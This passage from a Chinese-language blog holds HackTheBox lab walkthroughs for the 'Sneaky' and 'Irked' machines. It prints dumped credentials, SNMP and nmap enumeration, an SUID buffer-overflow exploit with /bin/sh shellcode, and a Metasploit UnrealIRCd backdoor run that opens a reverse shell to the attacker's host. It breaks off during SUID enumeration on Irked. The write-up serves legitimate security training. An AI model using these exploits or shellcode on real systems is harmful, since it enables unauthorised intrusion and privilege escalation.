pass&#39; for table &#39;users&#39; in database &#39;dev&#39;</span><br><span class="line">Database: dev</span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+--------------+----------------------+</span><br><span class="line">| name         | pass                 |</span><br><span class="line">+--------------+----------------------+</span><br><span class="line">| admin        | sup3rstr0ngp4ssf0r4d |</span><br><span class="line">| thrasivoulos | sup3rstr0ngp4ssf0r4d |</span><br><span class="line">+--------------+----------------------+</span><br></pre></td></tr></table></figure>
<p>扫出了两个用户，没啥思路了，看一下writeup提示，好吧，还要扫描UDP端口，161端口上运行snmp服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT      STATE         SERVICE        VERSION</span><br><span class="line">161&#x2F;udp   open          snmp           SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">| snmp-info:</span><br><span class="line">|   enterprise: net-snmp</span><br><span class="line">|   engineIDFormat: unknown</span><br><span class="line">|   engineIDData: fcf2da02d0831859</span><br><span class="line">|   snmpEngineBoots: 8</span><br><span class="line">|_  snmpEngineTime: 6h24m47s</span><br><span class="line">| snmp-interfaces:</span><br><span class="line">|   lo</span><br><span class="line">|     IP address: 127.0.0.1  Netmask: 255.0.0.0</span><br><span class="line">|     Type: softwareLoopback  Speed: 10 Mbps</span><br><span class="line">|     Traffic stats: 9.74 Kb sent, 9.74 Kb received</span><br><span class="line">|   eth0</span><br><span class="line">|     IP address: 10.10.10.20  Netmask: 255.255.255.0</span><br><span class="line">|     MAC address: 00:50:56:b9:37:ed (VMware)</span><br><span class="line">|     Type: ethernetCsmacd  Speed: 4 Gbps</span><br><span class="line">|_    Traffic stats: 7.92 Mb sent, 7.47 Mb received</span><br><span class="line">| snmp-netstat:</span><br><span class="line">|   TCP  127.0.0.1:3306       0.0.0.0:0</span><br><span class="line">|_  UDP  0.0.0.0:161          *:*</span><br></pre></td></tr></table></figure>
<p>既然IPv4的防火墙没有开放22端口，换个思路看一下IPv6的端口开放情况，前提就是我们知道靶机的IPv6本地唯一地址（类似IPv6的内网/私网地址），这里就要利用SNMP服务。</p>
<p>使用snmpwalk工具扫描靶机上的设备：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpwalk -v2c -c public 10.10.10.20 &gt; sneakly.snmp</span><br></pre></td></tr></table></figure>
<p>打开文件之后直接全局搜索<code>10.10.10.20</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200321122646.png" alt=""></p>
<p>我们就能找到靶机的IPv6地址(十进制表示)</p>
<blockquote>
<p>iso.3.6.1.2.1.4.34.1.4.2.16. 设备的OID号</p>
</blockquote>
<p>转换成十六进制表示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dead:beef::0250:56ff:feb9:2771</span><br></pre></td></tr></table></figure>
<p>当然，我一开始打开这个文件也是一脸懵逼的状态，完全不知道输出的是什么意思，我们可以适当的让snmpwalk输出的内容更加可读：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装软件</span><br><span class="line">sudo apt-get install snmp-mibs-downloader</span><br><span class="line"></span><br><span class="line"># 编辑文件，注释掉mibs:这一行</span><br><span class="line">vim &#x2F;etc&#x2F;snmp&#x2F;snmp.conf</span><br></pre></td></tr></table></figure>
<p>我们再执行snmpwalk命令，这一次可以再加一个OID参数减少输出的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.4.2.16</span><br><span class="line">IP-MIB::ipAddressType.ipv6.&quot;00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01&quot; &#x3D; INTEGER: unicast(1)</span><br><span class="line">IP-MIB::ipAddressType.ipv6.&quot;de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:27:71&quot; &#x3D; INTEGER: unicast(1)</span><br><span class="line">IP-MIB::ipAddressType.ipv6.&quot;fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:27:71&quot; &#x3D; INTEGER: unicast(1)</span><br></pre></td></tr></table></figure>
<p>整理一下和刚刚得到的地址是一样的。</p>
<p>除此之外，还可以使用靶机作者写的一个Python脚本得到靶机的IPv6地址，<a href="https://github.com/trickster0/Enyx">传送门</a>🚪</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200321141207.png" alt=""></p>
<blockquote>
<p>注意，要把/etc/snmp/snmp.conf文件改回来，不然会运行报错</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -sV -A -6 dead:beef::0250:56ff:feaa:0b69</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.50 ( https:&#x2F;&#x2F;nmap.org ) at 2017-07-30 22:11 IST</span><br><span class="line">Nmap scan report for dead:beef::250:56ff:feaa:b69</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 5d:5d:2a:97:85:a1:20:e2:26:e4:13:54:58:d6:a4:22 (DSA)</span><br><span class="line">|   2048 a2:00:0e:99:0f:d3:ed:b0:19:d4:6b:a8:b1:93:d9:87 (RSA)</span><br><span class="line">|   256 e3:29:c4:cb:87:98:df:99:6f:36:9f:31:50:e3:b9:42 (ECDSA)</span><br><span class="line">|_  256 e6:85:a8:f8:62:67:f7:01:28:a1:aa:00:b5:60:f2:21 (EdDSA)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| address-info: </span><br><span class="line">|   IPv6 EUI-64: </span><br><span class="line">|     MAC address: </span><br><span class="line">|       address: 00:50:56:aa:0b:69</span><br><span class="line">|_      manuf: VMware</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 35.18 seconds</span><br></pre></td></tr></table></figure>
<p>再用之前得到的SSH key登录靶机，拿到user.txt：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">λ ssh -6 -i sneaky.key thrasivoulos@dead:beef::0250:56ff:feb9:2771</span><br><span class="line">The authenticity of host &#39;dead:beef::250:56ff:feb9:2771 (dead:beef::250:56ff:feb9:2771)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq&#x2F;E2o.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no)? yes</span><br><span class="line">Warning: Permanently added &#39;dead:beef::250:56ff:feb9:2771&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 14.04.5 LTS (GNU&#x2F;Linux 4.4.0-75-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com&#x2F;</span><br><span class="line"></span><br><span class="line">  System information as of Fri Mar 20 08:31:46 EET 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:           160</span><br><span class="line">  Usage of &#x2F;:   9.9% of 18.58GB   Users logged in:     0</span><br><span class="line">  Memory usage: 10%               IP address for eth0: 10.10.10.20</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at:</span><br><span class="line">    https:&#x2F;&#x2F;landscape.canonical.com&#x2F;</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported until April 2019.</span><br><span class="line">Last login: Fri Mar 20 08:31:47 2020 from dead:beef:4::1057</span><br><span class="line">thrasivoulos@Sneaky:~$ ls</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
<p>检查suid文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thrasivoulos@Sneaky:~$ find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null;</span><br><span class="line">-rwsr-xr-x 1 root root 67704 Nov 24  2016 &#x2F;bin&#x2F;umount</span><br><span class="line">-rwsr-xr-x 1 root root 35300 May  4  2017 &#x2F;bin&#x2F;su</span><br><span class="line">-rwsr-xr-x 1 root root 88752 Nov 24  2016 &#x2F;bin&#x2F;mount</span><br><span class="line">-rwsr-xr-x 1 root root 43316 May  8  2014 &#x2F;bin&#x2F;ping6</span><br><span class="line">-rwsr-xr-x 1 root root 30112 May 15  2015 &#x2F;bin&#x2F;fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 38932 May  8  2014 &#x2F;bin&#x2F;ping</span><br><span class="line">-rwsrwsr-x 1 root root 7301 May  4  2017 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal</span><br><span class="line">-rwsr-xr-- 1 root dip 323000 Apr 21  2015 &#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">-rwsr-xr-x 1 root root 18168 Nov 24  2015 &#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 18136 May  8  2014 &#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils</span><br><span class="line">-rwsr-xr-x 1 root root 35916 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">-rwsr-xr-x 1 root root 66284 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 45420 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">-rwsr-xr-x 1 root root 72860 Oct 21  2013 &#x2F;usr&#x2F;bin&#x2F;mtr</span><br><span class="line">-rwsr-xr-x 1 root root 30984 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 156708 Oct 14  2016 &#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">-rwsr-xr-x 1 root root 44620 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">-rwsr-xr-- 1 root messagebus 333952 Dec  7  2016 &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 492972 Aug 11  2016 &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 9808 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">-rwsr-xr-x 1 root root 5480 Mar 27  2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br></pre></td></tr></table></figure>
<blockquote>
<p>命令解释：</p>
<p>-perm -4000 列出拥有setuid属性的文件和目录</p>
<p>-user root 文件或目录所有者属于root</p>
<p>-exec ls -ld {} \ 对之前列出的文件目录再执行<code>ls -ld</code>命令</p>
<p>2&gt;/dev/null 将标准错误输出stderr删掉</p>
</blockquote>
<p>查看<code>/usr/local/bin/chal</code>文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thrasivoulos@Sneaky:~$ file &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal: setuid, setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.24, BuildID[sha1]&#x3D;fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped</span><br></pre></td></tr></table></figure>
<p>好了，从这里开始就到了我的知识盲区了，涉及到栈溢出漏洞的利用，只能跟着大佬一步一步的来。</p>
<p>Shellcode：<a href="http://shell-storm.org/shellcode/files/shellcode-811.php">http://shell-storm.org/shellcode/files/shellcode-811.php</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thrasivoulos@Sneaky:&#x2F;usr&#x2F;local&#x2F;bin$ .&#x2F;chal $(python -c &#39;print &quot;\x90&quot;*330 +&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot; + &quot;\x42\xf4\xff\xbf&quot;*30&#39;)</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;1000(thrasivoulos) gid&#x3D;1000(thrasivoulos) euid&#x3D;0(root) egid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt</span><br><span class="line">c515[----------------------------]fb33</span><br></pre></td></tr></table></figure>
<h2 id="0x05-Summary">0x05 Summary</h2>
<p>Sneaky是一个2017年的靶机，评分5分，不得不说质量非常高。扫描常规的TCP端口和网站路径后，用基本的SQL注入拿到用户名和SSH key，但是现在遇到了没有开放22端口的问题，紧接着去扫描UDP端口，发现运行了SNMP服务，我们可以使用snmpwalk工具通过GETNEXT请求查询指定OID入口的所有OID树信息，由此获得了靶机了IPv6的地址，nmap扫描后发现开放了SSH 22端口。但是提权root用到了栈溢出的知识点，确实没什么基础，看起来有点吃力，先mark，下次有时间再研究一下。</p>
<h2 id="0x06-Reference">0x06 Reference</h2>
<p><a href="https://www.youtube.com/watch?v=1UGxjqTnuyo&amp;feature=youtu.be">https://www.youtube.com/watch?v=1UGxjqTnuyo&amp;feature=youtu.be</a></p>
<p><a href="https://s1gh.sh/hackthebox-sneaky-walkthrough/">https://s1gh.sh/hackthebox-sneaky-walkthrough/</a></p>
<p><a href="https://hkh4cks.com/blog/2017/12/30/htb-sneaky-walkthrough/">https://hkh4cks.com/blog/2017/12/30/htb-sneaky-walkthrough/</a></p>
<p><a href="https://www.hackingarticles.in/hack-the-box-challenge-sneaky-walkthrough/">https://www.hackingarticles.in/hack-the-box-challenge-sneaky-walkthrough/</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Irked Walkthrough</title>
    <url>/Target_drone/HackTheBox/9.HTB-Irked-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Irked-Walkthrough">HTB::Irked Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200323143336.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>steghide</li>
<li>metaspolit</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p><strong>nmap scan ports</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -sC -sV -p- 10.10.10.117 </span><br><span class="line">Nmap scan report for 10.10.10.117</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 65528 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)</span><br><span class="line">|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)</span><br><span class="line">|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)</span><br><span class="line">|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)</span><br><span class="line">80&#x2F;tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.10 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">111&#x2F;tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp   rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;udp6  rpcbind</span><br><span class="line">|   100024  1          39065&#x2F;tcp6  status</span><br><span class="line">|   100024  1          47673&#x2F;udp   status</span><br><span class="line">|   100024  1          49431&#x2F;tcp   status</span><br><span class="line">|_  100024  1          56811&#x2F;udp6  status</span><br><span class="line">6697&#x2F;tcp  open  irc     UnrealIRCd</span><br><span class="line">8067&#x2F;tcp  open  irc     UnrealIRCd</span><br><span class="line">49431&#x2F;tcp open  status  1 (RPC #100024)</span><br><span class="line">65534&#x2F;tcp open  irc     UnrealIRCd</span><br><span class="line">Service Info: Host: irked.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1762.08 seconds</span><br></pre></td></tr></table></figure>
<p><strong>website home page</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200323161109.png" alt=""></p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p><strong>search UnrealIRCd through msf</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search UnrealIRCd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                        Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                        ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution</span><br><span class="line">   msf5 &gt; use exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor</span><br><span class="line">msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT   6667             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; set RHOSTS 10.10.10.117</span><br><span class="line">RHOSTS &#x3D;&gt; 10.10.10.117</span><br><span class="line">msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; set RPORT 6697</span><br><span class="line">RPORT &#x3D;&gt; 6697</span><br><span class="line">msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; exploit                                               </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.10.16.99:4444 </span><br><span class="line">[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...</span><br><span class="line">    :irked.htb NOTICE AUTH :*** Looking up your hostname...</span><br><span class="line">[*] 10.10.10.117:6697 - Sending backdoor command...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: echo XSY6AWtTV0SElhyO;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: &quot;XSY6AWtTV0SElhyO\r\n&quot;</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 1 opened (10.10.16.99:4444 -&gt; 10.10.10.117:36674) at 2020-03-23 04:21:50 -0400 </span><br></pre></td></tr></table></figure>
<p><strong>python tty shell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">ircd@irked:~&#x2F;Unreal3.2$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;1001(ircd) gid&#x3D;1001(ircd) groups&#x3D;1001(ircd)</span><br><span class="line">ircd@irked:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x  3 ircd root 4096 May 15  2018 .</span><br><span class="line">drwxr-xr-x  4 root root 4096 May 14  2018 ..</span><br><span class="line">-rw-------  1 ircd ircd  333 May 15  2018 .bash_history</span><br><span class="line">-rw-r--r--  1 ircd ircd    0 May 14  2018 .bashrc</span><br><span class="line">-rw-r--r--  1 ircd ircd   66 May 14  2018 .selected_editor</span><br><span class="line">drwx------ 13 ircd ircd 4096 Mar 22 18:37 Unreal3.2</span><br></pre></td></tr></table></figure>
<p><strong>exeamine histroy command</strong> <code>.bash_history</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ircd@irked:~$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line">ls</span><br><span class="line">cat aliases</span><br><span class="line">ls keys</span><br><span class="line">ls keys</span><br><span class="line">ls keys&#x2F;CVS</span><br><span class="line">cd keys</span><br><span class="line">ls</span><br><span class="line">file CVS</span><br><span class="line">cd CVS</span><br><span class="line">ls</span><br><span class="line">ls Root</span><br><span class="line">cat Root&#x2F;Root</span><br><span class="line">cd Root</span><br><span class="line">ls</span><br><span class="line">file Root</span><br><span class="line">cat Root</span><br><span class="line">cd &#x2F;</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;home</span><br><span class="line">ls</span><br><span class="line">cd djmardov</span><br><span class="line">ls</span><br><span class="line">ls *</span><br><span class="line">cd &#x2F;tmp</span><br><span class="line">ls</span><br><span class="line">clear</span><br><span class="line">clear</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;tmp</span><br><span class="line">sudo -i</span><br><span class="line">cd &#x2F;home&#x2F;ircd</span><br><span class="line">clear</span><br><span class="line">ls</span><br><span class="line">ls -lah</span><br><span class="line">cd ..</span><br><span class="line">ls</span><br><span class="line">cd djmardov</span><br><span class="line">ls</span><br><span class="line">cd Documents</span><br><span class="line">ls -lah</span><br><span class="line">cat .backup</span><br><span class="line">clear</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<p><strong>Sensitive file</strong> <code>/home/djmardov/Documents/.backup</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ircd@irked:&#x2F;home&#x2F;djmardov&#x2F;Documents$ cat .backup</span><br><span class="line">cat .backup</span><br><span class="line">Super elite steg backup pw</span><br><span class="line">UPupDOWNdownLRlrBAbaSSss</span><br></pre></td></tr></table></figure>
<p><strong>Down the image</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wget http:&#x2F;&#x2F;10.10.10.117&#x2F;irked.jpg</span><br></pre></td></tr></table></figure>
<p><strong>steghide extract file from the image</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ steghide extract -sf irked.jpg</span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;pass.txt&quot;.</span><br><span class="line">$ cat pass.txt</span><br><span class="line">Kab6h+m+bbp2J:HG</span><br></pre></td></tr></table></figure>
<p><strong>SSH port 22</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh djmardov@10.10.10.117</span><br><span class="line">The authenticity of host &#39;10.10.10.117 (10.10.10.117)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:kunqU6QEf9TV3pbsZKznVcntLklRwiVobFZiJguYs4g.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;10.10.10.117&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">djmardov@10.10.10.117&#39;s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Tue May 15 08:56:32 2018 from 10.33.3.3</span><br><span class="line">djmardov@irked:~$ id</span><br><span class="line">uid&#x3D;1000(djmardov) gid&#x3D;1000(djmardov) groups&#x3D;1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)</span><br><span class="line">djmardov@irked:~$ cat ~&#x2F;Documents&#x2F;user.txt </span><br><span class="line">4a66a78b12dc0e661a59d3f5c0267a8e</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p><strong>Find SUID directory</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">djmardov@irked:~$ find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null;</span><br><span class="line">-rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 9468 Mar 28  2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 13816 Sep  8  2016 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">-rwsr-xr-x 1 root root 562536 Nov 19  2017 &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 13564 Oct 14  2014 &#x2F;usr&#x2F;lib&#x2F;spice-gtk&#x2F;spice-client-glib-usb-acl-helper</span><br><span class="line">-rwsr-xr-x 1 root root 1085300 Feb 10  2018 &#x2F;usr&#x2F;sbin&#x2F;exim4</span><br><span class="line">-rwsr-xr-- 1 root dip 338948 Apr 14  2015 &#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">-rwsr-xr-x 1 root root 43576 May 17  2017 &#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">-rwsr-sr-x 1 root mail 96192 Nov 18  2017 &#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">-rwsr-xr-x 1 root root 78072 May 17  2017 &#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 38740 May 17  2017 &#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 18072 Sep  8  2016 &#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">-rwsr-sr-x 1 root root 9468 Apr  1  2014 &#x2F;usr&#x2F;bin&#x2F;X</span><br><span class="line">-rwsr-xr-x 1 root root 53112 May 17  2017 &#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">-rwsr-xr-x 1 root root 52344 May 17  2017 &#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">-rwsr-xr-x 1 root root 7328 May 16  2018 &#x2F;usr&#x2F;bin&#x2F;viewuser</span><br><span class="line">-rwsr-xr-x 1 root root 96760 Aug 13  2014 &#x2F;sbin&#x2F;mount.nfs</span><br><span class="line">-rwsr-xr-x 1 root root 38868 May 17  2017 &#x2F;bin&#x2F;su</span><br><span class="line">-rwsr-xr-x 1 root root 34684 Mar 29  2015 &#x2F;bin&#x2F;mount</span><br><span class="line">-rwsr-xr-x 1 root root 34208 Jan 21  2016 &#x2F;bin&#x2F;fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 161584 Jan 28  2017 &#x2F;bin&#x2F;ntfs-3g</span><br><span class="line">-rwsr-xr-x 1 root root 26344 Mar 29  2015 